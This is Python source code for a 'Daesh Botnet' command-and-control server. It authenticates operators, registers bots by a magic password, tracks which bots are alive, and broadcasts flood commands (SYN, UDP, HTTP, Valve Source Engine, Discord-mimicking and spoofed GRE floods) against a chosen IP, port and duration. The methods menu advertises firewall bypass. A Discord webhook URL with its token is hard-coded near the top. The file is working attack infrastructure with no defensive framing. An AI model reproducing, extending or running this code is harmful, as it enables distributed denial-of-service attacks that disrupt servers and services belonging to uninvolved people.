from api import *
# Imports
import socket, threading, sys, time, ipaddress,requests
from discord_webhook import DiscordWebhook
from random import choice,choices,randint
from colorama import Fore, init, Back

OTP_WEB = "https://discord.com/api/webhooks/1077043960343691284/QrsDFlLvGoAphGA5jYouhx9ep7OGnuvD-HLOTKILvwhpRBmxbZI7wH4nkFMQLm59L6HT"
data = ""
otp_code = ''
num = 0
send_attack_target = 0

def color2(data_input_output):
    random_output = data_input_output

    if random_output == "GREEN":
        data = '\033[32m'
    elif random_output == "LIGHTGREEN_EX":
        data = '\033[92m'
    elif random_output == "YELLOW":
        data = '\033[33m'
    elif random_output == "LIGHTYELLOW_EX":
        data = '\033[93m'
    elif random_output == "CYAN":
        data = '\033[36m'
    elif random_output == "LIGHTCYAN_EX":
        data = '\033[96m'
    elif random_output == "BLUE":
        data = '\033[34m'
    elif random_output == "LIGHTBLUE_EX":
        data = '\033[94m'
    elif random_output == "MAGENTA":
        data = '\033[35m'
    elif random_output == "LIGHTMAGENTA_EX":
        data = '\033[95m'
    elif random_output == "RED":
        data = '\033[31m'
    elif random_output == "LIGHTRED_EX":
        data = '\033[91m'
    elif random_output == "BLACK":
        data = '\033[30m'
    elif random_output == "LIGHTBLACK_EX":
        data = '\033[90m'
    elif random_output == "WHITE":
        data = '\033[37m'
    elif random_output == "LIGHTWHITE_EX":
        data = '\033[97m'
    return data
lightwhite = color2("LIGHTWHITE_EX")
gray = color2("LIGHTBLACK_EX")

def color():

    random2 = ["GREEN","YELLOW","CYAN","BLUE","MAGENTA","RED","BLACK","WHITE","LIGHTGREEN_EX","LIGHTYELLOW_EX","LIGHTCYAN_EX","LIGHTBLUE_EX","LIGHTMAGENTA_EX","LIGHTRED_EX","LIGHTBLACK_EX","LIGHTWHITE_EX"]
    
    random2.remove('BLACK')
    random2.remove('LIGHTBLACK_EX')

    random = choice((random2))

    if random == "GREEN":
        data = '\033[32m'
    elif random == "LIGHTGREEN_EX":
        data = '\033[92m'
    elif random == "YELLOW":
        data = '\033[33m'
    elif random == "LIGHTYELLOW_EX":
        data = '\033[93m'
    elif random == "CYAN":
        data = '\033[36m'
    elif random == "LIGHTCYAN_EX":
        data = '\033[96m'
    elif random == "BLUE":
        data = '\033[34m'
    elif random == "LIGHTBLUE_EX":
        data = '\033[94m'
    elif random == "MAGENTA":
        data = '\033[35m'
    elif random == "LIGHTMAGENTA_EX":
        data = '\033[95m'
    elif random == "RED":
        data = '\033[31m'
    elif random == "LIGHTRED_EX":
        data = '\033[91m'
    elif random == "BLACK":
        data = '\033[30m'
    elif random == "LIGHTBLACK_EX":
        data = '\033[90m'
    elif random == "WHITE":
        data = '\033[37m'
    elif random == "LIGHTWHITE_EX":
        data = '\033[97m'
    return data
user_name = ""
bots = {}

# Banners

banner_2 = f"""
{gray}Hello @gov{lightwhite},{gray} welcome to Daesh Botnet{lightwhite}.
{gray}Display commands with:{lightwhite} "help"
{gray}View methods with:{lightwhite} "methods"
"""

banner = f"""
"""

l_banner = f"""
"""

HINT_PASSWORD = ''




TIITLE_MESSAGE = ''
DATA_TEXT = ''

message_test = f"""
╔═══════════════════════ [{TIITLE_MESSAGE}]
{DATA_TEXT}
╚════════════════════════"""

help = f"""{lightwhite}HELP         {gray}Shows list of commands   
{lightwhite}METHODS      {gray}Shows list of methods      
{lightwhite}SERVERS      {gray}Shows available servers
{lightwhite}CLEAR        {gray}Clears the screen          
{lightwhite}EXIT         {gray}Disconnects from the net
"""

methods = f"""
   {gray}Methods:
     {lightwhite}.syn        {gray}| Simple syn+ack flood to exhaust server resources.
     {lightwhite}.tcp        {gray}| Enhanced TCP flood with crafted TCP options for bypass.
     {lightwhite}.tup        {gray}| Syn+ack+rst packets to disrupt active TCP connections.
     {lightwhite}.rand_std   {gray}| Randomized packets flag flood to bypass firewall.
     {lightwhite}.rand_hex   {gray}| GRE-encapsulated TCP flood with spoofed IPs.
     {lightwhite}.fivem      {gray}| Plain udp flood with random or static payload fivem.
     {lightwhite}.udp        {gray}| Random length udp flood to bypass basic filtering.
     {lightwhite}.rand_vse   {gray}| Valve Source Engine query flood to disrupt game servers.
     {lightwhite}.discord    {gray}| Udp flood using Discord payload to mimic voice traffic.
     {lightwhite}.http       {gray}| Simple http flood optimized for higher requests.
     {lightwhite}.icmpflood  {gray}| Simple icmp flood to exhaust server resources.
"""

layer7 = f""""""
ansi_clear = '\033[2J\033[H'

# Validate IP
def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts)

# Validate Port
def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

# Validate attack time
def validate_time(time):
    return time.isdigit() and int(time) >= 1 and int(time) <= 999999999999

# Validate buffer size
def validate_size(size):
    return size.isdigit() and int(size) > 0 and int(size) <= 999999999999

# Read credentials from login file
def find_login(client,username, password):
    credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split(':')
        if c_username.lower() == username.lower() and c_password == password:
            return True

# Checks if bots are dead
def ping():
    while 1:
        dead_bots = []
        for bot in bots.copy().keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

# Client handler
def handle_client(client, address):
    global num
    send(client, f'\x1bDaesh Botnet | Login: Awaiting Response...\a', False)
    send(client, ansi_clear, False)
    color_random = color()
    send(client, f'{lightwhite}Connecting...')
    time.sleep(1)
    for x in l_banner.split('\n'):
        send(client,f'{color_random}'+x)
    while 1:
        send(client, f'\x1b{gray}Username :\x1b[0m ', False, False)
        username = client.recv(99999999).decode().strip()
        if not username:
            print(username)
            continue
        break

    num = 0

    # Password Login
    password = ''
    while 1:
        send(client, f'\033{lightwhite}Password :\x1b[0;38;2;0;0;0m ', False, False)
        while not password.strip(): 
            password = client.recv(99999999).decode('cp1252').strip()
        break
        
    # Handle client
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(client,username, password):
            send(client, Fore.RED + f'Invalid user or password')
            time.sleep(1)
            client.close()
            return

        global user_name
        user_name = username

        threading.Thread(target=update_title, args=(client,username)).start()
        threading.Thread(target=command_line, args=[client]).start()

    # Handle bot
    else:
        # Check if bot is already connected
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})

# Send data to client or bot
def send(socket, data, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

# Send command to all bots
def broadcast(data):
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

# Updates Shell Title
def update_title(client, name):
    while 1:
        try:
            send(client, f"\33]0;[|] Daesh | Bots: {len(bots)} | Username: {name} [|]\a", False)
            time.sleep(1)
            send(client, f"\33]0;[/] Daesh | Bots: {len(bots)} | Username: {name} [/]\a", False)
            time.sleep(1)
            send(client, f"\33]0;[-] Daesh | Bots: {len(bots)} | Username: {name} [-]\a", False)
            time.sleep(1)
            send(client, f"\33]0;[\] Daesh | Bots: {len(bots)} | Username: {name} [\]\a", False)
            time.sleep(1)
        except:
            client.close()

color_random = color()

# Telnet Command Line
def command_line(client):
    global socket_loader
    global otp_code
    global DATA_TEXT
    global TIITLE_MESSAGE
    global message_test
    
    color_random = color()
    for x in banner_2.split('\n'):
        send(client,f'{color_random}'+x)
        time.sleep(0.2)
    send(client,f'{color_random}')
    prompt = f'{gray}{user_name}{lightwhite}/daesh ~ '
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(99999999).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()

            color_random = color()
            if command == 'HELP':
                
                color_random = color()
                for x in banner.split('\n'):
                    send(client,f'{color_random}'+x)
                    time.sleep(0.2)
                data = ""
                if len(args) == 2:
                    data = args[1]
                    color_random = color()
                    if "ALL_TOOL" in data:
                        for x in help.split('\n'):
                            send(client,f'{color_random}'+x)
                else:
                    color_random = color()
                    for x in help.split('\n'):
                            send(client,f'{color_random}'+x)
                    color_random = color()

            elif command == 'METHODS':
                for x in methods.split('\n'):
                    send(client, '\x1b[3;31;40m'+x)

            elif command == 'CLEAR' or command== "CLS":
                
                send(client, ansi_clear, False)
                color_random = color()
                for x in banner_2.split('\n'):
                    send(client, f'{color_random}'+x)
                    time.sleep(0.2)
            elif command == 'LOGOUT' or command == "EXIT":
                color_random = color()
                for x in banner.split('\n'):
                    send(client,f'{color_random}'+x)
                    time.sleep(0.2)
                send(client, f'{Fore.LIGHTMAGENTA_EX}Successfully Logged out\n')
                time.sleep(1)
                break
            elif command == "UPDATE_UA":
                broadcast(data)
                color_random = color()
                send(client,f'{color_random}SENT UPDATE TO BOT . . .')
            elif command == '.UDP':  # UDP Junk (Random UDP Data)
                all_layer4(args,command, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear,attack_sent2, broadcast, data)
            elif command == '.FIVEM': #Fivem Udp flood
                all_layer4(args,command, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear,attack_sent2, broadcast, data)
            elif command == '.SOCKET': #Socket
                all_sent1(args,command, validate_ip, validate_port, validate_time,send, client, ansi_clear,attack_sent1, broadcast, data)
            elif command == '.OVH-TCP': #Ovh tcp handshake
                all_layer4(args,command, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear,attack_sent2, broadcast, data)
            elif command == '.HTTP':  # HTTP
                http_flooding_sent1(args,command, validate_port, validate_time,send, client, ansi_clear,attack_sent1, broadcast, data)
            elif command == '.CFB_SOCK':  # HTTP cfb
                http_flooding_sent1(args,command, validate_port, validate_time,send, client, ansi_clear,attack_sent1, broadcast, data)
            elif command == '.PYF':  # pyflooding
                http_flooding_sent1(args,command, validate_port, validate_time,send, client, ansi_clear,attack_sent1, broadcast, data)
            elif command == '.TLS_SMALL':  # tls
                http_flooding_sent1(args,command, validate_port, validate_time,send, client, ansi_clear,attack_sent1, broadcast, data)
            elif command == '.UDP_OPEN':  # UDP_OPEN
                all_sent1(args,command, validate_ip, validate_port, validate_time,send, client, ansi_clear,attack_sent1, broadcast, data)
            elif command == '.SYN':  # SYN
                all_sent1(args,command, validate_ip, validate_port, validate_time,send, client, ansi_clear,attack_sent1, broadcast, data)
            elif command == '.RAND_STD':  # STD
                all_sent1(args,command, validate_ip, validate_port, validate_time,send, client, ansi_clear,attack_sent1, broadcast, data)
            elif command == '.RAND_HEX':  # HEX
                all_sent1(args,command, validate_ip, validate_port, validate_time,send, client, ansi_clear,attack_sent1, broadcast, data)
            elif command == '.RAND_VSE':  # VSE
                all_sent1(args,command, validate_ip, validate_port, validate_time,send, client, ansi_clear,attack_sent1, broadcast, data)
            elif command == '.RAND_ALL':  # VSE | HEX | STD
                all_sent1(args,command, validate_ip, validate_port, validate_time,send, client, ansi_clear,attack_sent1, broadcast, data)
            elif command == '.TCP':  # TCP Junk (Random UDP Data)
                all_layer4(args,command, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear,attack_sent2, broadcast, data)
            elif command == '.TUP':  # TCP/UDP Junk (Random TCP/UDP Data)
                all_layer4(args,command, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear,attack_sent2, broadcast, data)
            elif command == '.HTTP_CFB':  # HTTP CFB
                http_req_all(args,command,validate_time, send, client, ansi_clear,attack_sent1, broadcast, data)
            elif command == '.HTTP_ALL':  # HTTP ALL
                http_req_all(args,command,validate_time, send, client, ansi_clear,attack_sent1, broadcast, data)
            elif command == '.HTTP_DFB': # HTTP DFB
                http_req2(args,validate_time, send, client, ansi_clear,attack_sent1, broadcast, data)
            elif command == '.HTTP_REQ':  # HTTP REQ
                http_req_all(args,command,validate_time, send, client, ansi_clear,attack_sent1, broadcast, data)
            else:
                send(client, Fore.RED + f'\x1b[3;31;40m{data} Invalid commands 📄!')
            send(client, prompt, False)
        except:
            break
    client.close()

screenedSuccessfully = """
        ╔════════════════════════════════════╗
        ║                                    ║
        ║        Successfully Screened       ║
        ║     ───────────────────────────    ║
        ║            ╔══════════╗            ║
        ╚════════════╣   LOGS   ╠════════════╝
                     ╚══════════╝
"""

def attack_sent1(ip, port, secs, client):
    global send_attack_target
    
    color_random = color()
    send(client, f"")
    for x in banner.split('\n'):
        send(client,f'{color_random}'+x)
        time.sleep(0.2)
    message_flooding = f"""{gray}Successfully sent command to ip={ip} port={port} secs={secs} with {len(bots)} bots"""
    color_random = color()
    for x in message_flooding.split('\n'):
        send(client,f'{color_random}'+x)
        time.sleep(0.2)
    send(client,f"")
    send_attack_target += 1

def attack_sent2(ip, port, secs, size, client):
    global send_attack_target
    
    color_random = color()
    send(client, f"")
    for x in banner.split('\n'):
        send(client,f'{color_random}'+x)
        time.sleep(0.2)
    message_flooding = f"""{gray}Successfully sent command to ip={ip} port={port} secs={secs} with {len(bots)} bots"""

    for x in message_flooding.split('\n'):
        send(client,f'{color_random}'+x)
        time.sleep(0.2)
    send(client,f"")
    send_attack_target += 1

def main():
    if len(sys.argv) != 2:
        print(f'Usage: screen python3 {sys.argv[0]} <C2 Port>')
        exit()
    port = sys.argv[1]
    if not port.isdigit() or int(port) < 1 or int(port) > 65535:
        print('\x1b[3;31;40m Invalid C2 port')
        exit()
    port = int(port)
    init(convert=True)
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print(screenedSuccessfully)
    try:
        sock.bind(('0.0.0.0', port))
    except:
        print('\x1b[3;31;40m Failed to bind port')
        exit()
    sock.listen()
    threading.Thread(target=ping).start() # Start keepalive thread
    # Accept all connections
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    try:
        main()
    except Exception:
        print('Error, skipping..')
